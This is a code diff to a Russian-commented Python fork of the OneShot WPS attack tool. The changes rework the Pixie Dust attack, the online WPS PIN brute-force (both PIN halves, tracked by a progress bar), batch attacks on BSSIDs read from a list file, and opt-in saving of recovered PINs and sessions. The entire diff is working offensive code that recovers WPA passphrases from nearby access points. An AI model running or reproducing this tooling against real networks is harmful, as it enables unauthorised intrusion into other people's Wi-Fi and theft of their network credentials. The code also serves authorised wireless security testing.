@@ -8,7 +8,9 @@ OneShotPin-fork (c) original rofl0r, mod drygdryg, enhanced kimocoder, fork inte
 - Генератор WPS PIN для многих вендоров
 - Красивая таблица сканирования с fallback, если не установлен wcwidth
 - Режим WPS Push Button
-- Сохранение сессий и экспорт учётных данных
+- НЕБЛОКИРУЮЩЕЕ чтение wpa_supplicant (без зависаний)
+- Прогресс-бар в реальном времени
+- Минимальное использование диска (по умолчанию ничего не сохраняет)
 - Пакетный режим: атака нескольких целей из файла (--bssid-list)
 """
 
@@ -22,10 +24,9 @@ import codecs
 import socket
 import pathlib
 import time
-from datetime import datetime
-import collections
-import statistics
+import select
 import csv
+from datetime import datetime
 from pathlib import Path
 from typing import Dict, List, Optional, Tuple, Any
 
@@ -38,16 +39,14 @@ except ImportError:
 
 def _wcswidth(text: str) -> int:
     """Возвращает отображаемую ширину строки (колонки терминала).
-    Если wcwidth отсутствует — просто количество символов."""
+       Если wcwidth отсутствует — просто количество символов."""
     if _HAS_WCWIDTH:
         return wcwidth.wcswidth(text)
     return len(text)
 
 def truncate_str(s: str, length: int, postfix: str = "…") -> str:
-    """
-    Обрезает строку до заданной отображаемой ширины.
-    Без wcwidth — обрезает по количеству символов.
-    """
+    """Обрезает строку до заданной отображаемой ширины.
+       Без wcwidth — обрезает по количеству символов."""
     if _HAS_WCWIDTH:
         orig_width = wcwidth.wcswidth(s)
         if orig_width <= length:
@@ -70,14 +69,18 @@ def truncate_str(s: str, length: int, postfix: str = "…") -> str:
             result = result[:length]
         return result + ' ' * (length - result_width)
     else:
-        # Простой fallback: учитываем только число символов
         if len(s) <= length:
             return s + ' ' * (length - len(s))
         if len(postfix) >= length:
             return postfix[:length]
         return s[:length - len(postfix)] + postfix
 
-# ─── Вспомогательные классы (оригинал drygdryg с переводом комментариев) ───
+
+def get_hex(line: str) -> str:
+    """Извлекает hex-строку из строки wpa_supplicant вида '... - hexdump(len=...): XX YY ZZ ...'."""
+    a = line.split(':', 3)
+    return a[2].replace(' ', '').upper()
+
 
 class NetworkAddress:
     """Работа с MAC-адресом: строка ↔ целое число."""
@@ -219,7 +222,6 @@ class WPSpin:
     def getSuggestedList(self, mac: str) -> List[str]:
         """Список наиболее вероятных PIN для данного MAC (по базе OUI)."""
         mac_clean = mac.replace(':', '').upper()
-        # Полный словарь соответствия OUI -> алгоритм (сокращён для наглядности)
         algorithms = {
             'pin24': ('04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D', '32B2DC',
                       '381766', '404A03', '4E5D4E', '5067F0', '5CF4AB', '6A285D', '8E5D4E',
@@ -373,103 +375,78 @@ class WPSpin:
         return pin
 
 
-def recvuntil(pipe, what: str) -> str:
-    """Читает stdout пайпа до тех пор, пока не встретит 'what'."""
-    s = ''
-    while True:
-        inp = pipe.stdout.read(1)
-        if inp == '':
-            return s
-        s += inp
-        if what in s:
-            return s
-
-
-def get_hex(line: str) -> str:
-    """Извлекает hex-строку из строки wpa_supplicant вида '... - hexdump(len=...): XX YY ZZ ...'."""
-    a = line.split(':', 3)
-    return a[2].replace(' ', '').upper()
-
-
 class PixiewpsData:
     """Хранит данные, необходимые для Pixie Dust атаки."""
     def __init__(self):
-        self.pke = ''
-        self.pkr = ''
-        self.e_hash1 = ''
-        self.e_hash2 = ''
-        self.authkey = ''
-        self.e_nonce = ''
+        self.pke = self.pkr = self.e_hash1 = self.e_hash2 = self.authkey = self.e_nonce = ''
 
-    def clear(self) -> None:
+    def clear(self):
         self.__init__()
 
-    def got_all(self) -> bool:
-        return (self.pke and self.pkr and self.e_nonce and self.authkey
-                and self.e_hash1 and self.e_hash2)
+    def got_all(self):
+        return all((self.pke, self.pkr, self.e_nonce, self.authkey, self.e_hash1, self.e_hash2))
 
-    def get_pixie_cmd(self, full_range: bool = False) -> str:
-        cmd = (f"pixiewps --pke {self.pke} --pkr {self.pkr} --e-hash1 {self.e_hash1} "
-               f"--e-hash2 {self.e_hash2} --authkey {self.authkey} --e-nonce {self.e_nonce}")
-        if full_range:
-            cmd += ' --force'
-        return cmd
+    def get_pixie_cmd(self, full_range=False):
+        return f"pixiewps --pke {self.pke} --pkr {self.pkr} --e-hash1 {self.e_hash1} --e-hash2 {self.e_hash2} --authkey {self.authkey} --e-nonce {self.e_nonce}" + (' --force' if full_range else '')
 
 
 class ConnectionStatus:
     """Состояние текущей WPS транзакции."""
     def __init__(self):
-        self.status = ''            # WSC_NACK, WPS_FAIL, GOT_PSK
+        self.status = ''
         self.last_m_message = 0
         self.essid = ''
         self.wpa_psk = ''
 
-    def isFirstHalfValid(self) -> bool:
+    def isFirstHalfValid(self):
         return self.last_m_message > 5
 
-    def clear(self) -> None:
+    def clear(self):
         self.__init__()
 
 
 class BruteforceStatus:
-    """Управление прогрессом брутфорса и сохранением сессий."""
+    """Лёгкий прогресс-бар, не пишет на диск."""
     def __init__(self):
-        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        self.mask = ''                       # текущая маска (4 или 7 символов)
-        self.last_attempt_time = time.time()
-        self.attempts_times = collections.deque(maxlen=15)
-        self.counter = 0
-        self.statistics_period = 5
+        self.start_time = time.time()
+        self.mask = ''
+        self.phase = 'first'
+        self.done = 0
 
-    def display_status(self) -> None:
-        average_pin_time = statistics.mean(self.attempts_times)
-        if len(self.mask) == 4:
-            percentage = int(self.mask) / 11000 * 100
-        else:
-            percentage = ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
-        print(f'[*] {percentage:.2f}% завершено @ {self.start_time} ({average_pin_time:.2f} секунд/PIN)')
-
-    def registerAttempt(self, mask: str) -> None:
+    def update(self, mask: str, phase: str = 'first'):
         self.mask = mask
-        self.counter += 1
-        current_time = time.time()
-        self.attempts_times.append(current_time - self.last_attempt_time)
-        self.last_attempt_time = current_time
-        if self.counter == self.statistics_period:
-            self.counter = 0
-            self.display_status()
+        self.phase = phase
+        if phase == 'first':
+            self.done = int(mask) if mask.isdigit() else self.done
+            total = 10000
+        else:
+            self.done = int(mask[4:]) if len(mask) >= 7 else 0
+            total = 1000
 
-    def clear(self) -> None:
-        self.__init__()
+        elapsed = time.time() - self.start_time
+        done_now = self.done
+        frac = min(done_now / total, 1.0)
+        eta = (elapsed / done_now) * (total - done_now) if done_now > 0 else 0
+        bar_len = 25
+        filled = int(bar_len * frac)
+        bar = '█' * filled + '░' * (bar_len - filled)
+        sys.stdout.write(f'\r[+] Прогресс: |{bar}| {frac*100:5.1f}% {done_now}/{total} | ETA: {eta:3.0f}с | {mask}')
+        sys.stdout.flush()
+
+    def finish(self):
+        print()
 
 
 class Companion:
     """Основной класс: управление wpa_supplicant, атакой, сканированием."""
     def __init__(self, interface: str, save_result: bool = False,
-                 print_debug: bool = False, bssid: str = ''):
+                 print_debug: bool = False, bssid: str = '',
+                 save_state: bool = False, save_pin: bool = False):
         self.interface = interface
         self.save_result = save_result
         self.print_debug = print_debug
+        self.save_state = save_state
+        self.save_pin = save_pin
 
         self.tempdir = tempfile.mkdtemp()
         with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
@@ -485,18 +462,28 @@ class Companion:
         self.pixie_creds = PixiewpsData()
         self.connection_status = ConnectionStatus()
 
-        user_home = str(pathlib.Path.home())
-        self.sessions_dir = f'{user_home}/.OneShot/sessions/'
-        self.pixiewps_dir = f'{user_home}/.OneShot/pixiewps/'
-        self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
-        for d in (self.sessions_dir, self.pixiewps_dir, self.reports_dir):
-            os.makedirs(d, exist_ok=True)
+        # Пути для сохранения создаются только при необходимости
+        self.sessions_dir = None
+        self.pixiewps_dir = None
+        self.reports_dir = None
+        if self.save_state or self.save_pin:
+            home = str(pathlib.Path.home())
+            if self.save_state:
+                self.sessions_dir = f'{home}/.OneShot/sessions/'
+                os.makedirs(self.sessions_dir, exist_ok=True)
+            if self.save_pin:
+                self.pixiewps_dir = f'{home}/.OneShot/pixiewps/'
+                os.makedirs(self.pixiewps_dir, exist_ok=True)
+        if self.save_result:
+            self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
+            os.makedirs(self.reports_dir, exist_ok=True)
 
         self.generator = WPSpin()
         self.bssid = bssid
         self.lastPwr = 0
+        self.bruteforce = None   # будет заполнен при брутфорсе
 
-    def __init_wpa_supplicant(self) -> None:
+    def __init_wpa_supplicant(self):
         """Запускает wpa_supplicant и ждёт готовности управляющего сокета."""
         print('[*] Запуск wpa_supplicant…')
         cmd = f'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{self.interface} -c{self.tempconf}'
@@ -517,7 +504,7 @@ class Companion:
     def sendAndReceive(self, command: str) -> str:
         """Отправляет команду и возвращает ответ."""
         self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
-        (b, address) = self.retsock.recvfrom(4096)
+        (b, _) = self.retsock.recvfrom(4096)
         return b.decode('utf-8', errors='replace')
 
     @staticmethod
@@ -529,17 +516,8 @@ class Companion:
                         'Пересоберите с CONFIG_WPS=y')
         return '[!] Что-то пошло не так — смотрите отладочный вывод'
 
-    def __handle_wpas(self, pixiemode: bool = False, pbc_mode: bool = False,
-                      verbose: bool = None, bssid: str = "") -> bool:
+    def _parse_wpas_line(self, line: str, pixiemode: bool, pbc_mode: bool, verbose: bool, bssid: str):
         """Разбирает строки вывода wpa_supplicant, заполняет данные Pixie Dust и статус."""
-        if verbose is None:
-            verbose = self.print_debug
-        line = self.wpas.stdout.readline()
-        if not line:
-            self.wpas.wait()
-            return False
-        line = line.rstrip('\n')
-
         if verbose:
             sys.stderr.write(line + '\n')
 
@@ -613,11 +591,11 @@ class Companion:
                     "'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
             self.__print_with_indicators('*', 'Ассоциация с точкой доступа…')
         elif ('Associated with' in line) and (self.interface in line):
-            bssid = line.split()[-1].upper()
+            bssid_part = line.split()[-1].upper()
             if self.connection_status.essid:
-                self.__print_with_indicators('+', f'Ассоциирован с {bssid} (ESSID: {self.connection_status.essid})')
+                self.__print_with_indicators('+', f'Ассоциирован с {bssid_part} (ESSID: {self.connection_status.essid})')
             else:
-                self.__print_with_indicators('+', f'Ассоциирован с {bssid}')
+                self.__print_with_indicators('+', f'Ассоциирован с {bssid_part}')
         elif 'EAPOL: txStart' in line:
             self.connection_status.status = 'eapol_start'
             self.__print_with_indicators('*', 'Отправка EAPOL Start…')
@@ -628,9 +606,9 @@ class Companion:
         elif self.bssid in line and 'level=' in line:
             self.lastPwr = line.split("level=")[1].split(" ")[0]
         elif pbc_mode and ('selected BSS ' in line):
-            bssid = line.split('selected BSS ')[-1].split()[0].upper()
-            self.connection_status.bssid = bssid
-            print(f'[*] Выбрана точка доступа: {bssid}')
+            selected_bssid = line.split('selected BSS ')[-1].split()[0].upper()
+            self.connection_status.status = 'selected_bssid'
+            print(f'[*] Выбрана точка доступа: {selected_bssid}')
         elif bssid in line and 'level=' in line:
             signal = line.split("level=")[1].split(" ")[0]
             if 'noise=' in line:
@@ -639,7 +617,154 @@ class Companion:
             else:
                 print(f'[i] Текущий сигнал: {signal}')
 
-        return True
+    def __wps_connection(self, bssid: str = None, pin: str = None,
+                         pixiemode: bool = False, pbc_mode: bool = False,
+                         verbose: bool = None, bf_status: BruteforceStatus = None) -> bool:
+        """Выполняет одну WPS‑транзакцию с неблокирующим чтением."""
+        if verbose is None:
+            verbose = self.print_debug
+        self.pixie_creds.clear()
+        self.connection_status.clear()
+        # Очищаем буфер wpa_supplicant
+        while True:
+            r, _, _ = select.select([self.wpas.stdout], [], [], 0)
+            if not r:
+                break
+            self.wpas.stdout.readline()
+
+        if pbc_mode:
+            cmd = f'WPS_PBC {bssid}' if bssid else 'WPS_PBC'
+        else:
+            cmd = f'WPS_REG {bssid} {pin}'
+
+        r = self.sendAndReceive(cmd)
+        if 'OK' not in r:
+            self.connection_status.status = 'WPS_FAIL'
+            print(self._explain_wpas_not_ok_status(cmd, r))
+            return False
+
+        start = time.time()
+        timeout = 30   # макс время транзакции
+        while True:
+            ready, _, _ = select.select([self.wpas.stdout], [], [], 0.15)
+            if ready:
+                line = self.wpas.stdout.readline()
+                if not line:
+                    if self.wpas.poll() is not None:
+                        break
+                    continue
+                line = line.rstrip('\n')
+                self._parse_wpas_line(line, pixiemode, pbc_mode, verbose, bssid.lower() if bssid else '')
+                if self.connection_status.status in ('WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
+                    break
+            else:
+                if bf_status and self.connection_status.status == '':
+                    bf_status.update(bf_status.mask, bf_status.phase)
+            if time.time() - start > timeout:
+                print('[!] Таймаут соединения, пропускаем')
+                break
+
+        self.sendOnly('WPS_CANCEL')
+        return False
+
+    def single_connection(self, bssid: str = None, pin: str = None,
+                          pixiemode: bool = False, pbc_mode: bool = False,
+                          showpixiecmd: bool = False, pixieforce: bool = False) -> bool:
+        """Основная логика одной атаки (с брутфорсом или без)."""
+        if not pin:
+            if pixiemode:
+                # Если разрешено сохранение, пробуем загрузить сохранённый PIN
+                pin = None
+                if self.save_pin and self.pixiewps_dir:
+                    fn = os.path.join(self.pixiewps_dir, f'{bssid.replace(":", "").upper()}.run')
+                    if os.path.isfile(fn):
+                        with open(fn) as f:
+                            pin = f.readline().strip()
+                if not pin:
+                    suggested = self.generator.getSuggestedPins(bssid)
+                    pin = suggested[0]['pin'] if suggested else '12345670'
+            elif not pbc_mode:
+                pin = self.__prompt_wpspin(bssid) or '12345670'
+
+        self.__wps_connection(bssid, pin, pixiemode, pbc_mode)
+        if self.connection_status.status == 'GOT_PSK':
+            self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
+            if self.save_result:
+                self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
+            if self.save_pin and self.pixiewps_dir:
+                self.__savePin(bssid, pin)
+            return True
+        elif pixiemode and self.pixie_creds.got_all():
+            pin = self.__runPixiewps(showpixiecmd, pixieforce)
+            if pin:
+                return self.single_connection(bssid, pin, pixiemode=False)
+        return False
+
+    def smart_bruteforce(self, bssid: str, start_pin: str = None, delay: float = None) -> Optional[str]:
+        """Запускает онлайн-брутфорс с прогресс-баром и восстановлением сессии (если включено --save-state)."""
+        self.bruteforce = BruteforceStatus()
+        mask = '0000'
+        if start_pin and len(start_pin) >= 4:
+            mask = start_pin[:4]
+        elif self.save_state and self.sessions_dir:
+            fn = os.path.join(self.sessions_dir, f'{bssid.replace(":", "").upper()}.run')
+            if os.path.isfile(fn):
+                with open(fn) as f:
+                    mask = f.readline().strip()
+        self.bruteforce.mask = mask
+        try:
+            if len(mask) == 4:
+                f_half = self.__first_half_bruteforce(bssid, mask, delay)
+                if f_half and self.connection_status.status != 'GOT_PSK':
+                    self.__second_half_bruteforce(bssid, f_half, '001', delay)
+            elif len(mask) == 7:
+                f_half = mask[:4]
+                s_half = mask[4:]
+                self.__second_half_bruteforce(bssid, f_half, s_half, delay)
+        except KeyboardInterrupt:
+            print("\nБрутфорс прерван.")
+            if self.save_state and self.sessions_dir:
+                os.makedirs(self.sessions_dir, exist_ok=True)
+                fn = os.path.join(self.sessions_dir, f'{bssid.replace(":", "").upper()}.run')
+                with open(fn, 'w') as f:
+                    f.write(self.bruteforce.mask)
+                print(f'[i] Сессия сохранена в {fn}')
+        finally:
+            self.bruteforce.finish()
+
+    def __first_half_bruteforce(self, bssid: str, f_half: str, delay: float = None) -> Optional[str]:
+        """Перебирает первую половину PIN (0000..9999)."""
+        checksum = self.generator.checksum
+        while int(f_half) < 10000:
+            t = int(f_half + '000')
+            pin = f'{f_half}000{checksum(t)}'
+            self.__wps_connection(bssid, pin, bf_status=self.bruteforce)
+            if self.connection_status.isFirstHalfValid():
+                return f_half
+            elif self.connection_status.status == 'WPS_FAIL':
+                continue
+            self.bruteforce.update(f_half, 'first')
+            f_half = str(int(f_half) + 1).zfill(4)
+            if delay:
+                time.sleep(delay)
+        return None
+
+    def __second_half_bruteforce(self, bssid: str, f_half: str, s_half: str, delay: float = None) -> Optional[str]:
+        """Перебирает вторую половину PIN (001..999) для заданной первой половины."""
+        checksum = self.generator.checksum
+        while int(s_half) < 1000:
+            t = int(f_half + s_half)
+            pin = f'{f_half}{s_half}{checksum(t)}'
+            self.__wps_connection(bssid, pin, bf_status=self.bruteforce)
+            if self.connection_status.last_m_message > 6 or self.connection_status.status == 'GOT_PSK':
+                return pin
+            elif self.connection_status.status == 'WPS_FAIL':
+                continue
+            self.bruteforce.update(f_half + s_half, 'second')
+            s_half = str(int(s_half) + 1).zfill(3)
+            if delay:
+                time.sleep(delay)
+        return None
 
     def __runPixiewps(self, showcmd: bool = False, full_range: bool = False) -> Optional[str]:
         """Запускает pixiewps и возвращает PIN, если найден."""
@@ -649,10 +774,8 @@ class Companion:
             print(cmd)
         r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                            stderr=sys.stdout, encoding='utf-8', errors='replace')
-        print(r.stdout)
         if r.returncode == 0:
-            lines = r.stdout.splitlines()
-            for line in lines:
+            for line in r.stdout.splitlines():
                 if '[+]' in line and 'WPS pin' in line:
                     pin = line.split(':')[-1].strip()
                     if pin == '<empty>':
@@ -668,6 +791,8 @@ class Companion:
 
     def __saveResult(self, bssid: str, essid: str, wps_pin: str, wpa_psk: str) -> None:
         """Сохраняет результат в .txt и .csv в папке reports."""
+        if not self.reports_dir:
+            return
         os.makedirs(self.reports_dir, exist_ok=True)
         filename = os.path.join(self.reports_dir, 'stored')
         dateStr = datetime.now().strftime("%d.%m.%Y %H:%M")
@@ -683,6 +808,8 @@ class Companion:
 
     def __savePin(self, bssid: str, pin: str) -> None:
         """Сохраняет PIN в файл .run для возможного повторного использования."""
+        if not self.pixiewps_dir:
+            return
         filename = os.path.join(self.pixiewps_dir, f'{bssid.replace(":", "").upper()}.run')
         with open(filename, 'w') as f:
             f.write(pin)
@@ -709,183 +836,12 @@ class Companion:
                 pass
             print('Неверный номер')
 
-    def __wps_connection(self, bssid: str = None, pin: str = None,
-                         pixiemode: bool = False, pbc_mode: bool = False,
-                         verbose: bool = None) -> bool:
-        """Выполняет одну WPS‑транзакцию с заданными параметрами."""
-        if verbose is None:
-            verbose = self.print_debug
-        self.pixie_creds.clear()
-        self.connection_status.clear()
-        # очистка буфера wpa_supplicant
-        self.wpas.stdout.read(300)
-        if pbc_mode:
-            if bssid:
-                print(f"[*] Запуск WPS push button подключения к {bssid}…")
-                cmd = f'WPS_PBC {bssid}'
-            else:
-                print("[*] Запуск WPS push button подключения…")
-                cmd = 'WPS_PBC'
-        else:
-            print(f"[*] Попытка PIN '{pin}'…")
-            cmd = f'WPS_REG {bssid} {pin}'
-
-        r = self.sendAndReceive(cmd)
-        if 'OK' not in r:
-            self.connection_status.status = 'WPS_FAIL'
-            print(self._explain_wpas_not_ok_status(cmd, r))
-            return False
-
-        while True:
-            res = self.__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode,
-                                     verbose=verbose, bssid=bssid.lower())
-            if not res:
-                break
-            if self.connection_status.status in ('WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
-                break
-
-        self.sendOnly('WPS_CANCEL')
-        return False
-
-    def single_connection(self, bssid: str = None, pin: str = None,
-                          pixiemode: bool = False, pbc_mode: bool = False,
-                          showpixiecmd: bool = False, pixieforce: bool = False,
-                          store_pin_on_fail: bool = False) -> bool:
-        """Основная логика одной атаки (с брутфорсом или без)."""
-        if not pin:
-            if pixiemode:
-                try:
-                    filename = os.path.join(self.pixiewps_dir, f'{bssid.replace(":", "").upper()}.run')
-                    with open(filename, 'r') as f:
-                        t_pin = f.readline().strip()
-                        if input(f'[?] Использовать ранее вычисленный PIN {t_pin}? [n/Y] ').lower() != 'n':
-                            pin = t_pin
-                        else:
-                            raise FileNotFoundError
-                except FileNotFoundError:
-                    pin = self.generator.getSuggestedPins(bssid)
-                    pin = pin[0]['pin'] if pin else '12345670'
-            elif not pbc_mode:
-                pin = self.__prompt_wpspin(bssid) or '12345670'
-        if pbc_mode:
-            self.__wps_connection(bssid, pbc_mode=True)
-            bssid = self.connection_status.bssid if hasattr(self.connection_status, 'bssid') else bssid
-            pin = '<PBC mode>'
-        elif store_pin_on_fail:
-            try:
-                self.__wps_connection(bssid, pin, pixiemode)
-            except KeyboardInterrupt:
-                print("\nПрервано пользователем…")
-                self.__savePin(bssid, pin)
-                return False
-        else:
-            self.__wps_connection(bssid, pin, pixiemode)
-
-        if self.connection_status.status == 'GOT_PSK':
-            self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
-            if self.save_result:
-                self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
-            if not pbc_mode:
-                filename = os.path.join(self.pixiewps_dir, f'{bssid.replace(":", "").upper()}.run')
-                try:
-                    os.remove(filename)
-                except FileNotFoundError:
-                    pass
-            return True
-        elif pixiemode:
-            if self.pixie_creds.got_all():
-                pin = self.__runPixiewps(showpixiecmd, pixieforce)
-                if pin:
-                    return self.single_connection(bssid, pin, pixiemode=False, store_pin_on_fail=True)
-                return False
-            else:
-                print('[!] Недостаточно данных для Pixie Dust атаки')
-                return False
-        else:
-            if store_pin_on_fail:
-                self.__savePin(bssid, pin)
-            return False
-
-    def smart_bruteforce(self, bssid: str, start_pin: str = None, delay: float = None) -> Optional[str]:
-        """Запускает онлайн-брутфорс с восстановлением сессии и отображением прогресса."""
-        if (not start_pin) or (len(start_pin) < 4):
-            try:
-                filename = os.path.join(self.sessions_dir, f'{bssid.replace(":", "").upper()}.run')
-                with open(filename, 'r') as f:
-                    if input(f'[?] Восстановить предыдущую сессию для {bssid}? [n/Y] ').lower() != 'n':
-                        mask = f.readline().strip()
-                    else:
-                        raise FileNotFoundError
-            except FileNotFoundError:
-                mask = '0000'
-        else:
-            mask = start_pin[:7]
-
-        self.bruteforce = BruteforceStatus()
-        self.bruteforce.mask = mask
-        try:
-            if len(mask) == 4:
-                f_half = self.__first_half_bruteforce(bssid, mask, delay)
-                if f_half and self.connection_status.status != 'GOT_PSK':
-                    self.__second_half_bruteforce(bssid, f_half, '001', delay)
-            elif len(mask) == 7:
-                f_half = mask[:4]
-                s_half = mask[4:]
-                self.__second_half_bruteforce(bssid, f_half, s_half, delay)
-            raise KeyboardInterrupt
-        except KeyboardInterrupt:
-            print("\nБрутфорс прерван.")
-            filename = os.path.join(self.sessions_dir, f'{bssid.replace(":", "").upper()}.run')
-            with open(filename, 'w') as f:
-                f.write(self.bruteforce.mask)
-            print(f'[i] Сессия сохранена в {filename}')
-            if args.loop:
-                raise KeyboardInterrupt
-
-    def __first_half_bruteforce(self, bssid: str, f_half: str, delay: float = None) -> Optional[str]:
-        """Перебирает первую половину PIN (0000..9999)."""
-        checksum = self.generator.checksum
-        while int(f_half) < 10000:
-            t = int(f_half + '000')
-            pin = f'{f_half}000{checksum(t)}'
-            self.single_connection(bssid, pin)
-            if self.connection_status.isFirstHalfValid():
-                print('[+] Первая половина найдена')
-                return f_half
-            elif self.connection_status.status == 'WPS_FAIL':
-                print('[!] Сбой WPS транзакции, повтор последнего PIN')
-                return self.__first_half_bruteforce(bssid, f_half)
-            f_half = str(int(f_half) + 1).zfill(4)
-            self.bruteforce.registerAttempt(f_half)
-            if delay:
-                time.sleep(delay)
-        print('[-] Первая половина не найдена')
-        return None
-
-    def __second_half_bruteforce(self, bssid: str, f_half: str, s_half: str, delay: float = None) -> Optional[str]:
-        """Перебирает вторую половину PIN (001..999) для заданной первой половины."""
-        checksum = self.generator.checksum
-        while int(s_half) < 1000:
-            t = int(f_half + s_half)
-            pin = f'{f_half}{s_half}{checksum(t)}'
-            self.single_connection(bssid, pin)
-            if self.connection_status.last_m_message > 6:
-                return pin
-            elif self.connection_status.status == 'WPS_FAIL':
-                print('[!] Сбой WPS транзакции, повтор последнего PIN')
-                return self.__second_half_bruteforce(bssid, f_half, s_half)
-            s_half = str(int(s_half) + 1).zfill(3)
-            self.bruteforce.registerAttempt(f_half + s_half)
-            if delay:
-                time.sleep(delay)
-        return None
-
     def __print_with_indicators(self, level: str, msg: str) -> None:
         """Выводит сообщение с уровнем сигнала."""
         print(f'[{level}] [{self.lastPwr}] {msg}')
 
-    def cleanup(self) -> None:
-        """Корректно завершает работу: закрывает сокеты, останавливает wpa_supplicant, удаляет временные файлы."""
+    def cleanup(self):
+        """Корректно завершает работу."""
         self.retsock.close()
         self.wpas.terminate()
         try:
@@ -907,9 +863,10 @@ class Companion:
 
 class WiFiScanner:
     """Сканирует WPS-сети и выводит красивую таблицу."""
-    def __init__(self, interface: str, vuln_list: List[str] = None):
+    def __init__(self, interface: str, vuln_list: List[str] = None, reverse_scan: bool = False):
         self.interface = interface
-        self.vuln_list = vuln_list
+        self.vuln_list = vuln_list or []
+        self.reverse_scan = reverse_scan
         reports_fname = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'reports', 'stored.csv')
         self.stored = []
         if os.path.isfile(reports_fname):
@@ -938,12 +895,16 @@ class WiFiScanner:
             if result.group(1) == 'capability':
                 sec = 'WEP' if 'Privacy' in result.group(2) else 'Open'
             elif sec == 'WEP':
-                if result.group(1) == 'RSN': sec = 'WPA2'
-                elif result.group(1) == 'WPA': sec = 'WPA'
+                if result.group(1) == 'RSN':
+                    sec = 'WPA2'
+                elif result.group(1) == 'WPA':
+                    sec = 'WPA'
             elif sec == 'WPA':
-                if result.group(1) == 'RSN': sec = 'WPA/WPA2'
+                if result.group(1) == 'RSN':
+                    sec = 'WPA/WPA2'
             elif sec == 'WPA2':
-                if result.group(1) == 'WPA': sec = 'WPA/WPA2'
+                if result.group(1) == 'WPA':
+                    sec = 'WPA/WPA2'
             networks[-1]['Security type'] = sec
 
         def handle_wps(line, result, networks):
@@ -990,6 +951,7 @@ class WiFiScanner:
                 res = re.match(regexp, line)
                 if res:
                     handler(line, res, networks)
+
         networks = list(filter(lambda x: x['WPS'], networks))
         if not networks:
             return {}
@@ -1010,7 +972,7 @@ class WiFiScanner:
             '#', 'BSSID', 'ESSID', 'Безоп.', 'PWR', 'Имя устройства WSC', 'Модель WSC'))
 
         items = list(network_list.items())
-        if args.reverse_scan:
+        if self.reverse_scan:
             items = items[::-1]
         for n, net in items:
             number = f'{n})'
@@ -1063,8 +1025,6 @@ def die(msg: str):
     sys.exit(1)
 
 
-# ─── Главная программа ───
-
 if __name__ == '__main__':
     import argparse
 
@@ -1082,6 +1042,8 @@ if __name__ == '__main__':
     parser.add_argument('--pbc', '--push-button-connect', action='store_true', help='WPS Push Button подключение')
     parser.add_argument('-d', '--delay', type=float, default=0.0, help='Задержка между попытками PIN (сек)')
     parser.add_argument('-w', '--write', action='store_true', help='Сохранять учётные данные в файл')
+    parser.add_argument('--save-state', action='store_true', help='Сохранять прогресс брутфорса (для возобновления)')
+    parser.add_argument('--save-pin', action='store_true', help='Сохранять успешный PIN для повторных атак')
     parser.add_argument('--iface-down', action='store_true', help='Выключить интерфейс после завершения')
     parser.add_argument('--vuln-list', default=os.path.join(os.path.dirname(os.path.realpath(__file__)), 'vulnwsc.txt'),
                         help='Файл со списком уязвимых устройств')
@@ -1111,7 +1073,7 @@ if __name__ == '__main__':
     exit_code = 0
 
     try:
-        # ── Пакетная обработка (новая фича) ──
+        # Пакетная обработка
         if args.bssid_list:
             if not os.path.isfile(args.bssid_list):
                 die(f'Файл {args.bssid_list} не найден')
@@ -1120,7 +1082,8 @@ if __name__ == '__main__':
             print(f'[i] Загружено {len(bssids)} целей из {args.bssid_list}')
             for bssid in bssids:
                 print(f'\n--- Атака на {bssid} ---')
-                companion = Companion(args.interface, args.write, print_debug=args.verbose, bssid=bssid)
+                companion = Companion(args.interface, args.write, args.verbose, bssid,
+                                      args.save_state, args.save_pin)
                 try:
                     if args.bruteforce:
                         companion.smart_bruteforce(bssid, args.pin, args.delay)
@@ -1134,7 +1097,7 @@ if __name__ == '__main__':
                 print(f'--- {bssid}: завершено ---')
             sys.exit(exit_code)
 
-        # ── Обычный режим / цикл ──
+        # Обычный режим / цикл
         while True:
             if not args.bssid:
                 try:
@@ -1142,7 +1105,7 @@ if __name__ == '__main__':
                         vuln_list = f.read().splitlines()
                 except FileNotFoundError:
                     vuln_list = []
-                scanner = WiFiScanner(args.interface, vuln_list)
+                scanner = WiFiScanner(args.interface, vuln_list, args.reverse_scan)
                 if not args.loop:
                     print('[*] BSSID не указан — сканируем сети…')
                 args.bssid = scanner.prompt_network()
@@ -1151,7 +1114,8 @@ if __name__ == '__main__':
                         continue
                     break
 
-            companion = Companion(args.interface, args.write, print_debug=args.verbose, bssid=args.bssid)
+            companion = Companion(args.interface, args.write, args.verbose, args.bssid,
+                                  args.save_state, args.save_pin)
             try:
                 if args.bruteforce:
                     companion.smart_bruteforce(args.bssid, args.pin, args.delay)
@@ -1165,8 +1129,7 @@ if __name__ == '__main__':
 
             if not args.loop:
                 break
-            else:
-                args.bssid = None
+            args.bssid = None
 
     except KeyboardInterrupt:
         print("\nВыход…")
